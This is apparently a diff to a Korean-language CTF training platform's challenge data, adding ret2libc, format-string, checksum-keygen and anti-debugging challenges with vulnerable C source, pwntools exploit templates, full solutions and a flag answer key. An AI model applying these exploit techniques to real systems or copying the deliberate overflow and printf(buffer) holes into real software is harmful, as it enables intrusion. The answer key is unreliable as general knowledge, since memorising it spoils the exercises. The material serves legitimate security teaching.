@@ -182,6 +182,205 @@ p.interactive()
 """,
     },
     {
+        "id": "pwn-ret2system",
+        "category": "pwn",
+        "title": "ret2system: ret2libc 맛보기 — 실제 라이브러리 함수 호출하기",
+        "difficulty": "중급",
+        "tool_focus": "gdb",
+        "situation": (
+            "ret2win과 달리 이번에는 '정답 함수'가 없습니다. 대신 system() 함수가 바이너리에 "
+            "링크되어 있지만 어디서도 호출되지 않습니다. 스택 버퍼 오버플로우로 system()을 "
+            "원하는 인자(cmd 문자열)와 함께 직접 호출하도록 만들어야 합니다 — NX(스택 실행 방지)가 "
+            "켜져 있어도 이미 존재하는 라이브러리 코드를 재사용하면(ret2libc) 임의 명령을 실행시킬 "
+            "수 있다는 것을 보여주는 챌린지입니다."
+        ),
+        "objective": "ret2win의 '주소를 찾아 return address를 덮어쓰는' 기술에 더해, x86-64 호출 규약에 맞게 레지스터(rdi)에 인자를 넣는 ROP 가젯 하나를 추가로 사용해 봅니다.",
+        "source_filename": "ret2system.c",
+        "source_code": """// ret2system.c — PWN 102: ret2libc 맛보기
+// gcc -fno-stack-protector -no-pie -o ret2system ret2system.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+char cmd[] = "echo PWN{r3t2sy5tem_ropp1ng_w1th_style}";
+
+void unused(void) {
+    // 이 함수는 프로그램 흐름상 어디서도 호출되지 않지만,
+    // system()의 PLT 항목이 바이너리에 생기도록 남겨둔 것입니다.
+    system("echo this line never runs");
+}
+
+void vulnerable(void) {
+    char buffer[64];
+    printf("Enter your name: ");
+    fflush(stdout);
+    read(0, buffer, 256);   // ret2win과 동일한 오버플로우
+    printf("Hello, %s!\\n", buffer);
+}
+
+int main(void) {
+    setvbuf(stdout, NULL, _IONBF, 0);
+    printf("=== ret2system: 이번엔 win()이 없습니다 ===\\n");
+    printf("system()은 링크되어 있지만 프로그램 흐름상 절대 호출되지 않습니다.\\n");
+    vulnerable();
+    printf("Goodbye.\\n");
+    return 0;
+}
+""",
+        "build_steps": [
+            "위 소스를 ret2system.c로 저장합니다 (아래 [소스 다운로드] 버튼 사용 가능).",
+            "실습 환경 안에서: gcc -fno-stack-protector -no-pie -o ret2system ret2system.c",
+            "objdump -d ret2system | grep 'system@plt' 로 system()의 PLT 주소를 확인합니다.",
+            "objdump -t ret2system | grep ' cmd' (또는 nm ret2system | grep cmd) 로 cmd 문자열(\"echo PWN{...}\")의 주소를 확인합니다.",
+        ],
+        "analysis_steps": [
+            "ret2win과 동일하게 gdb + cyclic(200)으로 return address까지의 정확한 오프셋을 구합니다.",
+            "ROPgadget --binary ret2system --only \"pop|ret\" 로 pop rdi; ret 가젯의 주소를 찾습니다. (x86-64는 함수 인자를 rdi 레지스터로 전달하므로, system(cmd)을 호출하려면 호출 직전에 rdi에 cmd 문자열의 주소를 넣어야 합니다.)",
+            "payload = 패딩(OFFSET) + pop_rdi_ret 주소 + cmd 문자열 주소 + system@plt 주소 순서로 이어붙입니다.",
+            "실행 후 화면에 flag(echo 명령의 출력)가 그대로 출력되는지 확인합니다.",
+        ],
+        "hints": [
+            "system()은 unused() 함수 안에서만 호출되지만, 이 함수 자체가 호출되지 않아도 컴파일된 바이너리에는 system()의 PLT 항목이 남아있습니다.",
+            "cmd는 포인터가 아니라 char 배열로 선언되어 있어, cmd의 주소 자체가 그 문자열(\"echo PWN{...}\")의 실제 위치입니다.",
+            "x86-64 System V 호출 규약에서 함수의 첫 번째 인자는 rdi 레지스터에 담깁니다 — 그래서 'pop rdi; ret' 가젯이 필요합니다.",
+            "payload 순서를 헷갈리지 마세요: [pop rdi 가젯 주소] 다음에 오는 값이 rdi에 들어갈 값(cmd 문자열 주소)이고, 그 다음이 pop rdi 가젯의 ret가 점프할 곳(system 주소)입니다.",
+        ],
+        "exploit_template": """#!/usr/bin/env python3
+from pwn import *
+
+context.binary = elf = ELF('./ret2system')
+p = process('./ret2system')
+
+# 1) ret2win과 동일하게 gdb + cyclic(200)으로 오프셋을 먼저 확인하세요.
+OFFSET = None  # TODO
+
+# 2) 필요한 주소들을 확인하세요.
+system_addr = elf.plt['system']
+cmd_addr = elf.symbols['cmd']
+pop_rdi_ret = None  # TODO: ROPgadget --binary ret2system --only "pop|ret" 로 확인
+
+log.info(f"system@plt: {hex(system_addr)}")
+log.info(f"cmd (\\"echo PWN{{...}}\\"): {hex(cmd_addr)}")
+
+payload = b'A' * OFFSET
+payload += p64(pop_rdi_ret)
+payload += p64(cmd_addr)
+payload += p64(system_addr)
+
+p.send(payload)
+print(p.recvall(timeout=3).decode(errors="replace"))
+""",
+        "solution": """1. gcc -fno-stack-protector -no-pie -o ret2system ret2system.c 로 빌드합니다.
+2. gdb + cyclic(200)으로 return address까지의 오프셋을 구합니다 (ret2win과 동일한 방법).
+3. objdump -d ret2system | grep 'system@plt' 로 system의 PLT 주소를 확인합니다.
+4. objdump -t ret2system | grep ' cmd' 로 cmd 문자열("echo PWN{...}")의 주소를 확인합니다.
+5. ROPgadget --binary ret2system --only "pop|ret" 로 pop rdi; ret 가젯 주소를 확인합니다.
+6. 아래처럼 exploit.py를 작성해 실행합니다:
+
+from pwn import *
+context.binary = elf = ELF('./ret2system')
+p = process('./ret2system')
+OFFSET = 72  # 직접 구한 값으로 교체
+payload = b'A' * OFFSET
+payload += p64(POP_RDI_RET)          # 3~5단계에서 구한 가젯 주소
+payload += p64(elf.symbols['cmd'])   # cmd 문자열("echo PWN{...}") 주소
+payload += p64(elf.plt['system'])    # system@plt 주소
+p.send(payload)
+print(p.recvall(timeout=3).decode(errors="replace"))
+
+7. system(cmd)이 실행되며 "echo PWN{...}" 명령의 출력, 즉 flag가 화면에 나타납니다:
+   PWN{r3t2sy5tem_ropp1ng_w1th_style}
+
+실전에서는 cmd가 "/bin/sh"인 경우가 많아 대화형 셸을 얻지만, 이 챌린지에서는 검증하기
+쉽도록 flag를 직접 출력하는 명령으로 구성했습니다. 원리는 동일합니다.
+""",
+    },
+    {
+        "id": "pwn-fmtstr",
+        "category": "pwn",
+        "title": "fmtstr: 포맷 스트링 취약점으로 스택 값 읽어내기",
+        "difficulty": "중급",
+        "tool_focus": "gdb",
+        "situation": (
+            "지금까지는 모두 '스택 버퍼 오버플로우'였습니다. 이번엔 완전히 다른 취약점입니다: "
+            "사용자 입력이 printf의 포맷 문자열로 그대로 사용됩니다. 이 프로그램은 스택에 숨겨진 "
+            "secret 값을 정확히 맞히면 flag를 보여줍니다."
+        ),
+        "objective": "포맷 스트링 취약점(%x, %p, %N$lx)으로 스택에 있는 임의의 값을 읽어내는(Arbitrary Read) 기법을 익힙니다. 실전에서는 이 기법으로 스택 카나리·ASLR 베이스 주소를 유출해 다른 공격과 조합합니다.",
+        "source_filename": "fmtstr.c",
+        "source_code": """// fmtstr.c — PWN 103: 포맷 스트링 취약점
+// gcc -fno-stack-protector -no-pie -o fmtstr fmtstr.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+void print_flag(void) {
+    printf("PWN{f0rm4t_str1ng_1nf0_l34k}\\n");
+    fflush(stdout);
+}
+
+int main(void) {
+    char buffer[128];
+    unsigned long secret = 0xdeadbeefcafebabeUL;
+
+    setvbuf(stdout, NULL, _IONBF, 0);
+    printf("=== fmtstr: 포맷 스트링으로 숨겨진 secret 값을 알아내면 flag가 열립니다 ===\\n");
+
+    printf("1) 아래 입력은 그대로 printf의 포맷 문자열로 사용됩니다.\\n");
+    printf("Input: ");
+    fflush(stdout);
+    memset(buffer, 0, sizeof(buffer));
+    if (fgets(buffer, sizeof(buffer), stdin) == NULL) return 1;
+    buffer[strcspn(buffer, "\\n")] = 0;
+    printf(buffer);   // 취약점: 사용자 입력을 포맷 문자열로 그대로 사용
+    printf("\\n\\n");
+
+    printf("2) secret 값을 알아냈다면 16진수로 입력하세요 (예: deadbeefcafebabe)\\n");
+    printf("Guess: ");
+    fflush(stdout);
+    char guess[64];
+    memset(guess, 0, sizeof(guess));
+    if (fgets(guess, sizeof(guess), stdin) == NULL) return 1;
+    unsigned long guessed = strtoul(guess, NULL, 16);
+
+    if (guessed == secret) {
+        print_flag();
+    } else {
+        printf("틀렸습니다. secret은 스택 어딘가에 있습니다 — 위치(%%N$lx)를 다시 찾아보세요.\\n");
+    }
+    return 0;
+}
+""",
+        "build_steps": [
+            "위 소스를 fmtstr.c로 저장합니다 (아래 [소스 다운로드] 버튼 사용 가능).",
+            "실습 환경 안에서: gcc -fno-stack-protector -no-pie -o fmtstr fmtstr.c",
+            "(printf(buffer)에 대한 -Wformat-security 경고가 뜰 수 있는데, 이 챌린지에서는 의도된 것이므로 무시해도 됩니다.)",
+        ],
+        "analysis_steps": [
+            "./fmtstr 를 실행하고 첫 입력에 %p %p %p %p %p %p %p %p %p %p 처럼 %p나 %lx를 여러 개 넣어 스택 값들을 순서대로 출력해봅니다.",
+            "출력된 값들 중 deadbeefcafebabe 패턴(혹은 그 일부)이 보이는 위치를 찾습니다.",
+            "%N$lx 형식(예: %9$lx)으로 정확히 그 위치 하나만 지정해서 값을 다시 확인합니다.",
+            "찾은 값을 두 번째 입력(Guess)에 16진수 그대로(deadbeefcafebabe) 입력하면 flag가 출력됩니다.",
+        ],
+        "hints": [
+            "%p는 포인터 형식(0x가 붙은 16진수)으로, %lx는 8바이트 16진수로 스택 값을 출력합니다.",
+            "printf(buffer)처럼 두 번째 인자 없이 포맷 문자열만 있으면, %x/%p/%lx는 실제로는 존재하지 않는 인자 대신 레지스터와 스택에 남아있던 값을 그대로 읽어옵니다.",
+            "몇 번째(%N$) 인자인지는 컴파일러/환경마다 다를 수 있습니다 — 처음부터 순서대로(%1$lx, %2$lx, ...) 넓게 스캔해보세요.",
+            "값이 정확히 deadbeefcafebabe로 보이는 위치가 정답입니다. 일부만 보이면(예: 4바이트만) %lx 대신 %x를 두 번 조합해보세요.",
+        ],
+        "solution": """1. gcc -fno-stack-protector -no-pie -o fmtstr fmtstr.c 로 빌드합니다.
+2. 실행 후 첫 입력에 다음처럼 넣어 스택을 넓게 스캔합니다:
+   %1$lx.%2$lx.%3$lx.%4$lx.%5$lx.%6$lx.%7$lx.%8$lx.%9$lx.%10$lx
+3. 출력 중 deadbeefcafebabe 값이 보이는 위치(%N$)를 확인합니다.
+4. 두 번째 입력(Guess)에 정확히 deadbeefcafebabe 를 입력합니다.
+5. flag가 출력됩니다: PWN{f0rm4t_str1ng_1nf0_l34k}
+
+실전 팁: 이 챌린지에서는 값을 '맞히기만' 했지만, 실제 공격에서는 이 기법으로 스택 카나리나
+리턴 주소(ASLR이 걸린 코드/라이브러리 베이스 계산용)를 유출해 ret2win·ret2libc 공격과
+조합하는 경우가 많습니다.
+""",
+    },
+    {
         "id": "reverse-crackme",
         "category": "reverse",
         "title": "crackme v1: Ghidra로 비밀번호 로직 분석하기",
@@ -267,11 +466,175 @@ int main(void) {
 6. ./crackme 를 실행해 'Gh1dra_Pr0!!'를 입력하면 flag가 출력됩니다.
 """,
     },
+    {
+        "id": "reverse-keygen",
+        "category": "reverse",
+        "title": "keygen_check: 알고리즘 기반 시리얼 검증 분석하기",
+        "difficulty": "중급",
+        "tool_focus": "ghidra",
+        "situation": (
+            "crackme v1은 '고정된 하나의 정답'을 찾는 문제였습니다. 이번엔 다릅니다 — 이 프로그램은 "
+            "'XXXX-XXXX' 형식의 시리얼을 받아 자릿수마다 가중치를 곱한 합(체크섬)이 특정 값과 같은지만 "
+            "확인합니다. 즉 정답이 하나가 아니라 조건을 만족하는 시리얼이 여러 개 존재합니다."
+        ),
+        "objective": "Ghidra로 가중합(체크섬) 알고리즘을 읽어내고, 정답을 '찾는' 것이 아니라 조건을 만족하는 시리얼을 '만들어내는'(keygen) 사고방식을 연습합니다.",
+        "source_filename": "keygen_check.c",
+        "source_code": """// keygen_check.c — REVERSE 102: 알고리즘 기반 시리얼 검증
+// gcc -no-pie -o keygen_check keygen_check.c
+#include <stdio.h>
+#include <string.h>
+
+// 시리얼 형식: NNNN-NNNN (숫자 8자리 + 하이픈)
+static int check_serial(const char *serial) {
+    if (strlen(serial) != 9) return 0;
+    if (serial[4] != '-') return 0;
+
+    int sum = 0;
+    for (int i = 0; i < 9; i++) {
+        if (i == 4) continue;
+        if (serial[i] < '0' || serial[i] > '9') return 0;
+        sum += (serial[i] - '0') * (i + 1);   // 자릿수 위치에 따른 가중합
+    }
+    return sum == 250;
+}
+
+int main(void) {
+    char input[32];
+    printf("=== keygen_check: 올바른 시리얼을 찾아내세요 (형식: 1234-5678) ===\\n");
+    printf("Serial: ");
+    fflush(stdout);
+    if (scanf("%31s", input) != 1) return 1;
+
+    if (check_serial(input)) {
+        printf("Valid! flag: RE{w31ght3d_ch3cksum_cr4ck3d}\\n");
+    } else {
+        printf("Invalid serial.\\n");
+    }
+    return 0;
+}
+""",
+        "build_steps": [
+            "위 소스를 keygen_check.c로 저장합니다 (아래 [소스 다운로드] 버튼 사용 가능).",
+            "실습 환경 안에서: gcc -no-pie -o keygen_check keygen_check.c",
+            "실전에서는 소스 없이 바이너리만 Ghidra에 넣는다고 가정하고 진행하세요.",
+        ],
+        "analysis_steps": [
+            "Ghidra로 keygen_check를 Import → Auto Analyze 후 main()과 check_serial() 디컴파일을 확인합니다.",
+            "형식 검사(길이 9, 5번째 문자 '-')와 반복문 안의 가중합 계산 로직을 읽습니다.",
+            "각 자리 숫자에 곱해지는 가중치(자리 인덱스+1, '-' 위치는 건너뜀)를 정리합니다.",
+            "가중합이 정확히 얼마와 같아야 통과하는지(목표값) 확인합니다.",
+            "목표값을 만족하는 숫자 8개를 파이썬으로 아무거나 찾아 시리얼을 구성해봅니다 (정답은 하나가 아닙니다).",
+            "만든 시리얼을 실제로 keygen_check에 입력해 flag가 출력되는지 확인합니다.",
+        ],
+        "hints": [
+            "인덱스는 0부터 시작하고, '-'가 있는 4번 인덱스는 건너뜁니다. 가중치는 (인덱스+1)입니다.",
+            "즉 가중치는 순서대로 1,2,3,4,(건너뜀),6,7,8,9 입니다.",
+            "목표 가중합은 250입니다. 각 자리는 0~9 사이 숫자이므로 나올 수 있는 최댓값은 9×(1+2+3+4+6+7+8+9)=360입니다 — 250은 충분히 달성 가능합니다.",
+            "Python으로 무작위 또는 완전탐색으로 조건을 만족하는 8자리를 찾은 뒤 'NNNN-NNNN' 형식으로 조립하면 됩니다.",
+        ],
+        "solution": """1. gcc -no-pie -o keygen_check keygen_check.c 로 빌드합니다.
+2. Ghidra로 check_serial()을 디컴파일하면 다음 로직을 확인할 수 있습니다:
+   - 길이 9, serial[4]=='-' 검사
+   - sum += (serial[i]-'0') * (i+1)  (i==4 제외)
+   - sum == 250 이어야 통과
+3. 조건을 만족하는 시리얼을 파이썬으로 찾습니다 (예시):
+
+   weights = [1,2,3,4,6,7,8,9]
+   # 무작위/완전탐색으로 sum(d*w for d,w in zip(digits,weights)) == 250 인 digits 8개를 찾음
+   # 예: 6488-7719  (6*1+4*2+8*3+8*4 + 7*6+7*7+1*8+9*9 = 250)
+
+4. ./keygen_check 를 실행해 6488-7719 (혹은 직접 찾은 다른 유효한 시리얼)를 입력하면
+   flag가 출력됩니다: RE{w31ght3d_ch3cksum_cr4ck3d}
+
+이 챌린지의 핵심은 '정답 하나를 찾는' crackme v1과 달리, 알고리즘 자체를 이해하면
+조건을 만족하는 시리얼을 스스로 '생성'할 수 있다는 것입니다 — 이것이 실제 keygen(제품 키
+생성기) crack의 원리입니다.
+""",
+    },
+    {
+        "id": "reverse-antidebug",
+        "category": "reverse",
+        "title": "antidebug_crackme: 안티 디버깅 탐지 우회하기",
+        "difficulty": "중급~고급",
+        "tool_focus": "ghidra",
+        "situation": (
+            "이 프로그램은 시작하자마자 디버거(ptrace)가 붙어있는지 검사하고, 감지되면 즉시 "
+            "종료합니다. gdb로 무작정 실행하면 비밀번호를 입력해보기도 전에 프로그램이 꺼져버립니다."
+        ),
+        "objective": "안티 디버깅 기법(PTRACE_TRACEME 자가 검사)의 원리를 이해하고, 이를 우회하는 여러 접근법(정적 분석으로 우회 자체를 회피, 동적 패치/LD_PRELOAD로 우회)을 익힙니다.",
+        "source_filename": "antidebug_crackme.c",
+        "source_code": """// antidebug_crackme.c — REVERSE 103: 안티 디버깅 탐지 우회하기
+// gcc -no-pie -o antidebug_crackme antidebug_crackme.c
+#include <stdio.h>
+#include <string.h>
+#include <sys/ptrace.h>
+
+static int is_being_debugged(void) {
+    // 이미 디버거(ptrace)가 붙어있으면 PTRACE_TRACEME 호출이 실패(-1)한다.
+    if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1) {
+        return 1;
+    }
+    return 0;
+}
+
+int main(void) {
+    char input[64];
+
+    if (is_being_debugged()) {
+        printf("디버거가 감지되었습니다. 종료합니다.\\n");
+        return 1;
+    }
+
+    printf("=== antidebug_crackme: 디버거 탐지를 우회하고 비밀번호를 맞혀보세요 ===\\n");
+    printf("Password: ");
+    fflush(stdout);
+    if (scanf("%63s", input) != 1) return 1;
+
+    if (strcmp(input, "byp4ss_th3_d3bugg3r") == 0) {
+        printf("Correct! flag: RE{4nt1_d3bug_byp4ss3d}\\n");
+    } else {
+        printf("Wrong password.\\n");
+    }
+    return 0;
+}
+""",
+        "build_steps": [
+            "위 소스를 antidebug_crackme.c로 저장합니다 (아래 [소스 다운로드] 버튼 사용 가능).",
+            "실습 환경 안에서: gcc -no-pie -o antidebug_crackme antidebug_crackme.c",
+            "일반 실행(./antidebug_crackme)은 정상 동작하지만, gdb ./antidebug_crackme 후 run 하면 안티 디버깅에 걸려 바로 종료되는 것을 먼저 확인해보세요.",
+        ],
+        "analysis_steps": [
+            "가장 쉬운 방법(권장): gdb로 실행하지 말고, Ghidra로 정적 분석만 하세요. Ghidra는 바이너리를 실행하지 않으므로 ptrace 안티 디버깅 검사가 애초에 동작하지 않습니다.",
+            "Ghidra에서 main()을 디컴파일해 strcmp() 비교 대상 문자열(비밀번호)을 그대로 읽어냅니다.",
+            "(심화, 선택) 동적 분석으로도 우회해보고 싶다면: LD_PRELOAD로 항상 성공(0)을 반환하는 가짜 ptrace() 함수를 만들어 실제 ptrace 호출을 가로채거나, gdb에서 ptrace 호출 직후 반환값(rax)을 0으로 강제 설정해보세요.",
+        ],
+        "hints": [
+            "안티 디버깅은 '프로그램이 실행될 때' 디버거 여부를 검사하는 기법입니다 — 애초에 실행하지 않는 정적 분석(Ghidra)에는 통하지 않습니다.",
+            "strcmp(input, \"...\")처럼 비교 대상 문자열이 하드코딩된 경우, Ghidra 디컴파일 결과나 strings 명령으로 바로 확인할 수 있습니다.",
+            "동적 우회를 시도한다면: gcc -shared -fPIC -o fake_ptrace.so fake_ptrace.c 로 항상 0을 반환하는 ptrace()를 만들고 LD_PRELOAD=./fake_ptrace.so gdb ./antidebug_crackme 로 실행해보세요.",
+            "이 기법(자가 ptrace 검사)은 다른 디버거를 붙이면(예: 이미 gdb가 붙은 프로세스에 다시 ptrace 시도) 실패하므로 감지되는 원리입니다.",
+        ],
+        "solution": """1. gcc -no-pie -o antidebug_crackme antidebug_crackme.c 로 빌드합니다.
+2. (확인용) gdb ./antidebug_crackme 후 run 하면 "디버거가 감지되었습니다"가 뜨며 바로 종료되는 것을 봅니다.
+3. 권장 풀이 — 정적 분석: Ghidra로 antidebug_crackme를 Import → Auto Analyze → main() 디컴파일.
+   strcmp(input, "byp4ss_th3_d3bugg3r") 비교 로직이 그대로 보입니다. 실행/디버깅 없이 바로 정답을 알 수 있습니다.
+4. ./antidebug_crackme 를 (디버거 없이) 정상 실행해 byp4ss_th3_d3bugg3r 를 입력하면
+   flag가 출력됩니다: RE{4nt1_d3bug_byp4ss3d}
+
+핵심 교훈: 안티 디버깅은 '동적 분석(디버거로 실행)'만 방해할 뿐, '정적 분석(Ghidra로 읽기만
+하기)'은 막지 못합니다. 실전에서 안티 디버깅이 걸린 바이너리를 만나면, 무조건 우회를
+시도하기 전에 정적 분석만으로 풀리는지부터 확인하는 것이 효율적입니다.
+""",
+    },
 ]
 
 FLAGS = {
     "pwn-ret2win": "PWN{r3t2w1n_st4ck_sm4sh1ng_101}",
+    "pwn-ret2system": "PWN{r3t2sy5tem_ropp1ng_w1th_style}",
+    "pwn-fmtstr": "PWN{f0rm4t_str1ng_1nf0_l34k}",
     "reverse-crackme": "RE{gh1dra_and_x0r_ar3_fr1ends}",
+    "reverse-keygen": "RE{w31ght3d_ch3cksum_cr4ck3d}",
+    "reverse-antidebug": "RE{4nt1_d3bug_byp4ss3d}",
 }
 
 
